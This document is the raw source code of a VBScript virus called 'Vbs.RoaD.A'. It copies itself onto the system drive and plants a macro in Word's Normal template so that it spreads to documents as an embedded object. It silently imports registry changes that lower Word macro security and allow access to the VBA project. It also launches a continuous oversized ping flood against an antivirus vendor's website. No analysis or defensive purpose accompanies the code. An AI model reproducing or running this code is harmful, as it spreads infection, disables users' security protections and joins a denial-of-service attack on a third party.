"'Vbs.RoaD.A
'coded by A.v_killer(PakBrain)
On Error Resume Next
spawn()
sub spawn()
Set s = CreateObject(""Scripting.FileSystemObject"")
Set f = s.GetFile(wscript.scriptfullname)
f.Copy (""c:\Road.vbs"")
f.Copy (""c:\folder\subfolder\...\Road.vbs"")
Word()
end sub
sub word()
norm =""Sub document_close()"" & vbCrLf & _
""On Error Resume Next"" & vbCrLf & _
""Open """"c:\Road.txt"""" For Output As 2"" & vbCrLf & _
""Print #2, """"sub document_open()"""""" & vbCrLf & _
""Print #2, """"On Error Resume Next"""""" & vbCrLf & _
""Print #2, """"'A.v_Killer"""""" & vbCrLf & _
""Print #2, """"obj = ActiveDocument.Shapes(1).OLEFormat.ClassType"""""" & vbCrLf & _
""Print #2, """"With ActiveDocument.Shapes(1).OLEFormat"""""" & vbCrLf & _
""Print #2, """"    .ActivateAs ClassType:=obj"""""" & vbCrLf & _
""Print #2, """"    .Activate"""""" & vbCrLf & _
""Print #2, """"End With"""""" & vbCrLf & _
""Print #2, """"end sub"""""" & vbCrLf & _
""Close 2"" & vbCrLf & _
""Set fso = CreateObject(""""Scripting.FileSystemObject"""")"" & vbCrLf & _
""Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule"" & vbCrLf & _
""Set iw = fso.OpenTextFile(""""c:\Road.txt"""", 1, True)"" & vbCrLf & _
""nt.DeleteLines 1, nt.CountOfLines"" & vbCrLf & _
""i = 1 "" & vbCrLf & _
""Do While iw.atendofstream <> True"" & vbCrLf & _
""b = iw.readline"" & vbCrLf & _
""nt.InsertLines i, b "" & vbCrLf & _
""i = i + 1 "" & vbCrLf & _
""Loop"" & vbCrLf & _
""ActiveDocument.Shapes.AddOLEObject _"" & vbCrLf & _
""FileName:=""""c:\Road.vbs"""", _"" & vbCrLf & _
""LinkToFile:=False"" & vbCrLf & _
""ActiveDocument.Save"" & vbCrLf & _
""Open """"c:\Road.reg"""" For Output As 3"" & vbCrLf & _
""Print #3, """"REGEDIT4"""""" & vbCrLf & _
""Print #3, """"[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"""""" & vbCrLf & _
""Print #3, """"""""""""Level""""""""=dword:00000001"""""" & vbCrLf & _
""Print #3, """"[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"""""" & vbCrLf & _
""Print #3, """"""""""""Level""""""""=dword:00000001"""""" & vbCrLf & _
""Print #3, """"""""""""AccessVBOM""""""""=dword:00000001"""""" & vbCrLf & _
""Close 3"" & vbCrLf & _
""Shell """"regedit /s c:\Road.reg"""", vbHide"" & vbCrLf & _
""Kill """"c:\Road.reg"""""" & vbCrLf & _
""End Sub""
Set fso = CreateObject(""Scripting.FileSystemObject"")
set f = fso.createtextfile(""c:\Road.txt"")
f.write norm
f.Close
Set oword = CreateObject(""Word.Application"")
oword.Visible = False
Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile(""c:\Road.txt"", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
oword.NormalTemplate.Save
oword.NormalTemplate.Close
Dos()
end sub
sub Dos()
Dim a
Set a = CreateObject(""WScript.Shell"")
a.run (""c:\windows\ping.exe -t -l 100000 www.avp.ch"")
end sub
msgbox ""ur suffering from virus"", ,""coded by ahsan my real name"
